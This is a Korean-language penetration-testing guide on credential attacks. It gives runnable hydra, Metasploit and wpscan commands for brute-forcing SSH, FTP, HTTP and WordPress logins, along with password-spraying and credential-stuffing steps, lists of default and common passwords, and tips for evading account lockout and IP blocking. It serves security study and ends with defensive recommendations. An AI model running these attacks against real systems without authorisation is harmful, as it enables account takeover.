---
sidebar_position: 2
title: Credential-Based Attacks
---

# 계정 정보 기반 공격

## 개요

계정 정보를 대상으로 하는 다양한 공격 기법

**주요 공격 유형**:
1. 브루트포스 (Brute Force)
2. 사전 공격 (Dictionary Attack)
3. 패스워드 스프레이 (Password Spraying)
4. 크레덴셜 스터핑 (Credential Stuffing)
5. 기본 계정 (Default Credentials)

---

## 공격 유형

### 1. 브루트포스 공격

모든 가능한 조합 시도

**특징**:
- 매우 느림
- 계정 잠금 위험 높음
- 강력한 비밀번호에 비효율적

```bash
# 예시 (4자리 숫자)
0000, 0001, 0002, ..., 9999
```

### 2. 사전 공격 (Dictionary Attack)

단어 사전 파일 기반 브루트포스

**특징**:
- 브루트포스보다 빠름
- 흔한 비밀번호에 효과적
- Wordlist 품질에 따라 성공률 차이

```bash
# 예시
password, 123456, admin, welcome, qwerty, ...
```

### 3. 패스워드 스프레이

하나의 비밀번호를 여러 계정에 시도

**특징**:
- 계정 잠금 회피
- 조직 내부 비밀번호 정책 활용
- 실무에서 가장 선호

**예시**:
```
admin:Password123!
user:Password123!
root:Password123!
```

### 4. 크레덴셜 스터핑

유출된 계정 정보를 다른 서비스에 시도

**특징**:
- 비밀번호 재사용 습관 악용
- 유출 데이터베이스 필요
- 높은 성공률

### 5. 기본 계정

서비스 기본 계정 정보 시도

**특징**:
- 매우 빠름
- 설정 미흡한 시스템에 효과적

**예시**:
```
admin:admin
root:root
administrator:password
```

---

## 실무 주의사항

### 계정 잠금 (Account Lockout)

```
로그인 실패 5회 → 계정 30분 잠금
```

**대응**:
- 패스워드 스프레이 사용
- 시도 간격 조절
- 다수 계정 분산 공격

### 호스트 블랙리스트

```
IP 단위 차단
```

**대응**:
- 프록시/VPN 사용
- 분산 공격

### 비밀번호 정책

```
최소 8자, 대소문자+숫자+특수문자
```

**대응**:
- 정책에 맞는 wordlist 생성
- 룰 기반 공격

---

## SSH 브루트포스

### 다수 유저 + 다수 비밀번호

```bash
hydra -L <유저파일> -P <비밀번호파일> ssh://<target> -s <port> -V

# 예시
hydra -L users.txt -P passwords.txt ssh://192.168.1.10 -s 22 -V
```

### 단일 유저 사전 공격

```bash
hydra -l <유저> -P <비밀번호파일> ssh://<target> -s <port> -V -f

# 예시
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 -s 22 -V -f
```

**주요 플래그**:
- `-L`: 유저 리스트 파일
- `-l`: 단일 유저
- `-P`: 패스워드 리스트 파일
- `-p`: 단일 패스워드
- `-f`: 성공 시 중지
- `-V`: Verbose (진행 상황 표시)
- `-t`: 병렬 연결 수 (기본 16)

### Metasploit 사용

```bash
msfconsole

use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run
```

---

## FTP 브루트포스

```bash
# 기본 브루트포스
hydra -L users.txt -P passwords.txt ftp://<target> -s <port> -V

# 단일 유저
hydra -l admin -P passwords.txt ftp://192.168.1.10 -s 21 -V -f

# 예시 (익명 로그인 확인)
hydra -l anonymous -p '' ftp://192.168.1.10 -V
```

---

## HTTP 브루트포스

### 필요 정보 확인 (Burp Suite)

1. **로그인 URL** - `/login.php`, `/admin/login`
2. **HTTP 메소드** - GET/POST
3. **파라미터 이름** - `username`, `password`, `user`, `pass`
4. **실패 메시지** - "Invalid username", "Incorrect password"

### WordPress 유저 이름 열거

```bash
# 유저 이름만 찾기
hydra -L users.txt -p 'test-password' <target> -s <port> \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -V

# 예시
hydra -L users.txt -p 'test' 192.168.1.10 -s 8081 \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -V
```

**결과 해석**:
```bash
[8081][http-post-form] host: 192.168.1.10   login: admin   password: test
[8081][http-post-form] host: 192.168.1.10   login: editor  password: test
```
→ `admin`, `editor` 계정 존재 확인

### WordPress 비밀번호 브루트포스

```bash
# 찾은 유저로 비밀번호 공격
hydra -L found-users.txt -P passwords.txt <target> -s <port> \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect" -V

# 예시
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 -s 8081 \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect" -V -f
```

### 일반 웹 로그인

```bash
# POST 방식
hydra -L users.txt -P passwords.txt <target> -s <port> \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed" -V

# GET 방식
hydra -L users.txt -P passwords.txt <target> -s <port> \
  http-get-form "/login:user=^USER^&pass=^PASS^:F=Invalid" -V
```

### WPScan (WordPress 전용)

```bash
# 자동 유저 열거 및 비밀번호 공격
wpscan --url http://<target> --passwords <비밀번호파일>

# 예시
wpscan --url http://192.168.1.10:8081 --passwords /usr/share/wordlists/rockyou.txt

# 특정 유저만 공격
wpscan --url http://192.168.1.10:8081 \
  --usernames admin,editor \
  --passwords passwords.txt
```

---

## 패스워드 스프레이

하나의 비밀번호를 여러 계정에 시도:

### SSH

```bash
hydra -L users.txt -p 'Password123!' ssh://<target> -s 22 -V

# 예시
hydra -L company-users.txt -p 'Welcome2024!' ssh://192.168.1.10 -V
```

### FTP

```bash
hydra -L users.txt -p 'ftppass' ftp://<target> -s 21 -V
```

### HTTP

```bash
hydra -L users.txt -p 'P@ssw0rd' <target> -s <port> \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V
```

### 일반적인 스프레이 비밀번호

```
Password123!
Welcome2024!
Company123!
Spring2024!
Winter2024!
P@ssw0rd
admin
password
```

---

## 크레덴셜 스터핑

유출된 계정 정보 활용:

### 유출 데이터 형식

```
# leaked-creds.txt
admin@company.com:Password123
user@company.com:Welcome2024
john.doe@company.com:P@ssw0rd
```

### 공격 실행

```bash
# 파일 분리
cut -d ':' -f 1 leaked-creds.txt > emails.txt
cut -d ':' -f 2 leaked-creds.txt > passwords.txt

# Hydra로 공격
hydra -L emails.txt -P passwords.txt ssh://<target>
```

### 유출 데이터베이스

- **Have I Been Pwned**: https://haveibeenpwned.com/
- **Dehashed**: https://dehashed.com/
- **LeakCheck**: https://leakcheck.io/

---

## 기본 계정 공격

### Google 검색

```
"<애플리케이션> <버전> default credentials"
"<서비스> default username password"

# 예시
"Apache Tomcat 9.0 default credentials"
"MySQL 5.7 default password"
"WordPress default admin"
```

### 일반적인 기본 계정

**데이터베이스**:
```
MySQL: root:root, root:(empty)
PostgreSQL: postgres:postgres
MongoDB: admin:admin
```

**웹 애플리케이션**:
```
Tomcat: admin:admin, tomcat:tomcat
Jenkins: admin:password
phpMyAdmin: root:root
```

**네트워크 장비**:
```
Cisco: admin:admin, cisco:cisco
Juniper: root:juniper
HP: admin:admin
```

### DefaultCreds-Cheat-Sheet

https://github.com/ihebski/DefaultCreds-cheat-sheet

```bash
git clone https://github.com/ihebski/DefaultCreds-cheat-sheet.git
cd DefaultCreds-cheat-sheet
grep -i "tomcat" default-passwords.csv
```

---

## Wordlist

### RockYou

```bash
# 위치
/usr/share/wordlists/rockyou.txt.gz

# 압축 해제 (처음 사용 시)
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# 크기 확인
wc -l /usr/share/wordlists/rockyou.txt
# 14,344,392 lines
```

### SecLists

```bash
# 설치
sudo apt install seclists

# 위치
/usr/share/seclists/

# 주요 wordlist
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

### 커스텀 Wordlist 생성

```bash
# Crunch로 생성
crunch 8 8 -t @@@@%%%% > custom.txt
# @@ = 소문자
# %% = 숫자
# 예시: abcd1234

# CeWL (웹 페이지에서 단어 수집)
cewl http://target.com -m 6 -w wordlist.txt
```

---

## 주요 명령어 요약

```bash
# SSH 브루트포스
hydra -L users.txt -P passwords.txt ssh://<target> -V

# FTP 브루트포스
hydra -L users.txt -P passwords.txt ftp://<target> -V

# HTTP 브루트포스
hydra -L users.txt -P passwords.txt <target> -s <port> \
  http-post-form "/login:user=^USER^&pass=^PASS^:F=Failed" -V

# WordPress 스캔
wpscan --url http://<target> --passwords passwords.txt

# 패스워드 스프레이
hydra -L users.txt -p 'CommonPass123!' ssh://<target> -V

# RockYou 압축 해제
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

## 속도 최적화

### Hydra 병렬 연결

```bash
# 병렬 연결 수 증가 (주의: 부하 증가)
hydra -t 32 -L users.txt -P passwords.txt ssh://<target>

# 기본값: 16
# 권장: 16-32
```

### 작은 Wordlist 먼저

```bash
# 1. 작은 wordlist (빠른 테스트)
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt ssh://<target>

# 2. 중간 wordlist
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ssh://<target>

# 3. 큰 wordlist (포괄적)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target>
```

## 실무 팁

1. ✅ **패스워드 스프레이 우선** - 계정 잠금 회피
2. ✅ **기본 계정 먼저 확인** - 빠른 성공 가능
3. ✅ **작은 wordlist부터** - 효율성
4. ✅ **타겟 정보 활용** - 회사명, 제품명 포함 단어
5. ✅ **시도 간격 조절** - `-w` 플래그 사용
6. ✅ **성공 시 즉시 중지** - `-f` 플래그

## 보안 권장사항

1. ✅ 강력한 비밀번호 정책
2. ✅ 계정 잠금 정책 활성화
3. ✅ 다단계 인증 (MFA)
4. ✅ 기본 계정 비활성화/변경
5. ✅ 로그인 시도 모니터링
6. ✅ IP 화이트리스트
